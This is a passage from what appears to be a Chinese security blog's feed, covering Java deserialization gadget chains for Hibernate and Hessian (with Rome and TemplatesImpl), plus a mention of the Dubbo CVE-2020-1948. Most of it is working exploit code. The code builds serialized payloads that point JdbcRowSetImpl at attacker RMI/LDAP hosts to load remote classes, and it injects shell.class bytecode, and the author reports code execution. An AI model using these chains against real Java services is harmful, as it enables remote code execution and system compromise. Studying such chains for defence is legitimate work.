<span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithoutConstructor</span><span class="params">(Class&lt;T&gt; classToInstantiate)</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        <span class="keyword">return</span> createWithConstructor(classToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; componentTypeClass             = Class.forName(<span class="string">&quot;org.hibernate.type.ComponentType&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; pojoComponentTuplizerClass     = Class.forName(<span class="string">&quot;org.hibernate.tuple.component.PojoComponentTuplizer&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; abstractComponentTuplizerClass = Class.forName(<span class="string">&quot;org.hibernate.tuple.component.AbstractComponentTuplizer&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成JdbcRowxxx</span></span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">rs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">        rs.setDataSourceName(<span class="string">&quot;rmi://192.168.142.129:9999/evilclass&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> JdbcRowSetImpl.class.getDeclaredMethod(<span class="string">&quot;getDatabaseMetaData&quot;</span>);</span><br><span class="line">        Object getter;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 创建 GetterMethodImpl 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法</span></span><br><span class="line">            Class&lt;?&gt;       getterImpl  = Class.forName(<span class="string">&quot;org.hibernate.property.access.spi.GetterMethodImpl&quot;</span>);</span><br><span class="line">            Constructor&lt;?&gt; constructor = getterImpl.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            getter = constructor.newInstance(<span class="literal">null</span>, <span class="literal">null</span>, method);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">            <span class="comment">// 创建 BasicGetter 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法</span></span><br><span class="line">            Class&lt;?&gt;       basicGetter = Class.forName(<span class="string">&quot;org.hibernate.property.BasicPropertyAccessor$BasicGetter&quot;</span>);</span><br><span class="line">            Constructor&lt;?&gt; constructor = basicGetter.getDeclaredConstructor(Class.class, Method.class, String.class);</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            getter = constructor.newInstance(rs.getClass(), method, <span class="string">&quot;databaseMetaData&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建 PojoComponentTuplizer 实例，用来触发 Getter 方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tuplizer</span> <span class="operator">=</span> createWithoutConstructor(pojoComponentTuplizerClass);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射将 BasicGetter 写入 PojoComponentTuplizer 的成员变量 getters 里</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> abstractComponentTuplizerClass.getDeclaredField(<span class="string">&quot;getters&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">getters</span> <span class="operator">=</span> Array.newInstance(getter.getClass(), <span class="number">1</span>);</span><br><span class="line">        Array.set(getters, <span class="number">0</span>, getter);</span><br><span class="line">        field.set(tuplizer, getters);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建 ComponentType 实例，用来触发 PojoComponentTuplizer 的 getPropertyValues 方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">type</span> <span class="operator">=</span> createWithoutConstructor(componentTypeClass);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射将相关值写入，满足 ComponentType 的 getHashCode 调用所需条件</span></span><br><span class="line">        setFieldValue(type,<span class="string">&quot;componentTuplizer&quot;</span>,tuplizer);</span><br><span class="line">        setFieldValue(type,<span class="string">&quot;propertySpan&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        setFieldValue(type,<span class="string">&quot;propertyTypes&quot;</span>,<span class="keyword">new</span> <span class="title class_">Type</span>[]&#123;(Type) type&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建 TypedValue 实例，用来触发 ComponentType 的 getHashCode 方法</span></span><br><span class="line">        <span class="type">TypedValue</span> <span class="variable">typedValue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TypedValue</span>((Type) type, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建反序列化用 HashMap</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(typedValue, <span class="string">&quot;su18&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// put 到 hashmap 之后再反射写入，防止 put 时触发</span></span><br><span class="line">        setFieldValue(typedValue,<span class="string">&quot;value&quot;</span>,rs);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230714002402940.png" alt="image-20230714002402940"></p><p><img src="../images/image-20230714002411609.png" alt="image-20230714002411609"></p><p><strong>这样就能执行了   (只是比较慢)</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> java-Hibernate </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>show-JWT</title>
      <link href="/posts/fb5deb43.html"/>
      <url>/posts/fb5deb43.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="341e88597f819d950b0f5c90612b48ba043f42566158cb0c370a43fd3332b7da"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> show-JWT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>show-SSRF</title>
      <link href="/posts/ded151a6.html"/>
      <url>/posts/ded151a6.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="9292b9611376b0203a8170a1f562518caf516bdb820d1b690e6cc554e5a64e98"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> show-SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java-Hessian</title>
      <link href="/posts/8319cacd.html"/>
      <url>/posts/8319cacd.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://goodapple.top/archives/1193">文章1</a>    <a href="https://su18.org/post/hessian/#xbean">文章2</a>  <a href="https://juejin.cn/post/7130570567547093023">文章3  字节</a>    <a href="http://moonflower.fun/index.php/2022/05/28/336/">文章4</a></p><p>这里前言和简介就不写了  上面给的文章写的都很清楚了   直接看就行了</p><p>(<strong>就是prc啥的  直接看上面的文章就行了</strong>)</p><p>这里的只分析链子</p><h2 id="Hessian反序列化漏洞分析"><a href="#Hessian反序列化漏洞分析" class="headerlink" title="Hessian反序列化漏洞分析"></a>Hessian反序列化漏洞分析</h2><p>Hessian反序列化漏洞的关键出在<code>HessianInput#readObject</code>，由于Hessian会将序列化的结果处理成一个Map，所以序列化结果的第一个<code>byte</code>总为<code>M</code>（ASCII为77）。下面我们跟进<code>readObject()</code></p><p><code>HessianInput#readObject</code>部分代码如下</p><p><img src="../images/image-20230625153912111.png" alt="image-20230625153912111"></p><p>打个断点来进行分析</p><p><img src="../images/image-20230625153943252.png" alt="image-20230625153943252"></p><p>跟进这个<code>readMap</code>()方法</p><p><img src="../images/image-20230625154035372.png" alt="image-20230625154035372"></p><p>接着跟进这个<code>getDeserializer</code>()方法    获取反序列化的返回结果</p><p><img src="../images/image-20230625154203052.png" alt="image-20230625154203052"></p><p>在获取到<code>deserializer</code>后，java会创建一个HashMap作为缓存，并将我们需要反序列化的类作为<code>key</code>放入HashMap中。</p><p><strong>看过rome链子的应该能反应过来这里 </strong>    <code>hashmap</code>   <code>key</code></p><p>后续代码能够触发任意类的<code>hashcode()</code>方法</p><p><img src="../images/image-20230625160235189.png" alt="image-20230625160235189"></p><p>因为这个<code>key</code>可控</p><p>至此，我们Gadget的构造思路也就十分清晰了，只需要找一条入口为hashcode()的反序列化链即可，比如我们常用的ROME链</p><h3 id="Hessian-Rome"><a href="#Hessian-Rome" class="headerlink" title="Hessian+Rome"></a>Hessian+Rome</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">* TemplatesImpl.getOutputProperties()</span><br><span class="line">* ToStringBean.toString(String)</span><br><span class="line">* ToStringBean.toString()</span><br><span class="line">* ObjectBean.toString()</span><br><span class="line">* EqualsBean.beanHashCode()</span><br><span class="line">* ObjectBean.hashCode()</span><br><span class="line">* HashMap&lt;K,V&gt;.hash(Object)</span><br><span class="line">* HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span><br></pre></td></tr></table></figure><p><strong>利用链如下</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian_JNDI</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="type">byte</span>[] serialize(T o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(bao);</span><br><span class="line">        output.writeObject(o);</span><br><span class="line">        System.out.println(bao.toString());</span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bai</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">HessianInput</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(bai);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> input.readObject();</span><br><span class="line">        <span class="keyword">return</span> (T) o;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(Object obj, String name)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://192.168.142.129:9999/EXP&quot;</span>;</span><br><span class="line">        jdbcRowSet.setDataSourceName(url);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(JdbcRowSetImpl.class,jdbcRowSet);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//手动生成HashMap，防止提前调用hashcode()</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> makeMap(equalsBean,<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] s = serialize(hashMap);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        System.out.println((HashMap)deserialize(s));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">( Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">        setValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230706165052839.png" alt="image-20230706165052839"></p><p><img src="../images/image-20230706165058207.png" alt="image-20230706165058207"></p><p>成功弹出计算器</p><h3 id="Apache-Dubbo-Hessian反序列化漏洞（CVE-2020-1948）"><a href="#Apache-Dubbo-Hessian反序列化漏洞（CVE-2020-1948）" class="headerlink" title="Apache Dubbo Hessian反序列化漏洞（CVE-2020-1948）"></a>Apache Dubbo Hessian反序列化漏洞（CVE-2020-1948）</h3><p>Apache Dubbo 是一款高性能的开源Java RPC框架。</p><h4 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h4><ul><li>2.7.0 &lt;= Dubbo Version &lt;= 2.7.6</li><li>2.6.0 &lt;= Dubbo Version &lt;= 2.6.7</li><li>Dubbo 所有 2.5.x 版本（官方团队目前已不支持）</li></ul><p><strong>这里的就不写了  了解一下就行了  因为搭建环境太麻烦了</strong></p><h3 id="TemplatesImpl-SignedObject二次反序列化-ROME不出网"><a href="#TemplatesImpl-SignedObject二次反序列化-ROME不出网" class="headerlink" title="TemplatesImpl+SignedObject二次反序列化(ROME不出网)"></a>TemplatesImpl+SignedObject二次反序列化(ROME不出网)</h3><p>上文我们构造的都是<code>JdbcRowSetImpl</code>这条ROME链，最终结果是造成JNDI注入。那如果目标不出网，我们又怎么利用呢？</p><p>或许你还记得ROME中的<code>TemplatesImpl</code>利用链，其能够加载任意类，进而任意代码执行。下面我们来尝试构造</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian2_TemplatesImpl</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">( Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">        setValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="type">byte</span>[] serialize(T o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(bao);</span><br><span class="line">        output.writeObject(o);</span><br><span class="line">        System.out.println(bao.toString());</span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bai</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">HessianInput</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(bai);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> input.readObject();</span><br><span class="line">        <span class="keyword">return</span> (T) o;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\google download\\shell.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] 